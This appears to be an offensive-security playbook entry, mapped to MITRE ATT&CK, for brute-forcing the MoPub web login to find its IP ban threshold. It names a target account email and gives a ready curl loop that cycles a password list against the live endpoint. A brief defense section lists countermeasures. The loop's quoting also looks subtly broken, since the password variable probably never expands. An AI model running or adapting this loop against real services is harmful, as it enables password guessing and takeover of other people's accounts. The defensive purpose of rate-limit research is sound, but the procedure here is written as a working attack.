---
tags:
  - brute-force
  - rate-limiting
  - testing
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/mopub-rate-limit-test-curl-loop]]'
  - '[[commands/mopub-login-payload-example]]'
platforms:
  - Web
techniques:
  - '[[Brute Force]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques:
  - '[[Password Guessing]]'
id: 71553954-6ba2-4336-aeba-ca09dfee8f9b
created_at: '2025-12-14T17:30:26.746Z'
updated_at: '2025-12-14T17:30:26.746Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Brute Force]]'
---
# Test-IP-Based-Rate-Limiting-on-MoPub-Login

## Summary

This procedure tests the MoPub login endpoint's rate limiting by sending repeated authentication attempts from a single IP to identify the ban threshold, revealing the lack of account-level protections.

## Description

The MoPub login at https://app.mopub.com/web-client/api/user/login enforces rate limiting solely at the IP level, banning after about 120 failed attempts without CAPTCHA, lockouts, or delays per username. This allows attackers to bypass via IP changes. The procedure uses curl to simulate brute-force until ban, confirming vulnerability for further exploitation.

## Requirements

1. Access to internet and curl tool
2. Password list file (PASS_LIST) with candidate passwords
3. Valid CSRF token from MoPub login page
4. Target username (e.g., alert.wids@gmail.com)

## Defense

Defensive measures and detection strategies:

- Implement account-level rate limiting with CAPTCHA after failures
- Add progressive delays or temporary lockouts per username
- Monitor for high-volume login attempts across IPs targeting single accounts

## Objectives

1. Verify IP ban threshold (~120 requests)
2. Confirm no per-account protections
3. Identify response patterns (401/400 fail, 503 ban)

## Instructions

### Step 1: Prepare Login Payload

**Context**: Format the JSON payload for login requests using [[commands/mopub-login-payload-example]] to understand the structure.

**Command** ([[commands/mopub-login-payload-example]]):
```json
{"username":"alert.wids@gmail.com","password":"$pass"}
```

> This payload sends a POST with fixed username and variable password. Expected: 401/400 for invalid, 204 for valid.

### Step 2: Execute Rate Limit Test

**Context**: Loop through passwords to trigger IP ban, demonstrating the limit.

**Command** ([[commands/mopub-rate-limit-test-curl-loop]]):
```bash
while read pass; do curl -i -s -k -X $'POST' -H $'Host: app.mopub.com' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'x-csrftoken: ███████' -H $'Origin: https://app.mopub.com' -H $'Referer: https://app.mopub.com/login?next=/' -H $'Cookie: csrftoken=███████; _ga=██████; mp__mixpanel=%7B%22distinct_id%22%3A%20%███%22%2C%22$device_id%22%3A%20%███████%22%2C%22accountKey%22%3A%20%22%22%2C%22accessLevel%22%3A%20%22%22%2C%22$initial_referrer%22%3A%20%22$direct%22%2C%22$initial_referring_domain%22%3A%20%22$direct%22%7D; ██████_mixpanel=%7B%22distinct_id%22%3A%20%22██████████%22%2C%22$initial_referrer%22%3A%20%22https%3A%2F%2Fapp.mopub.com%2Faccount%2Flogin%2F%22%2C%22$initial_referring_domain%22%3A%20%22app.mopub.com%22%2C%22accessLevel%22%3A%20%22loggedOut%22%2C%22accountKey%22%3A%20null%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%2C%22$user_id%22%3A%20%22█████%22%2C%22$had_persisted_distinct_id%22%3A%20true%2C%22$device_id%22%3A%20%22████████%22%7D; mp_mixpanel__c=3' --data-binary $'{"username":"alert.wids@gmail.com","password":"$pass"}' $'https://app.mopub.com/web-client/api/user/login';done < PASS_LIST
```

> Sends requests until ban. Stop after observing 503 response.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Brute Force]] Brute Force

### Sub-Techniques

- [[Password Guessing]] Password Guessing

## Commands Used

- [[commands/mopub-rate-limit-test-curl-loop]]
- [[commands/mopub-login-payload-example]]

## Tools Used

- [[tools/curl]]

## Tags

- brute-force
- rate-limiting
- testing
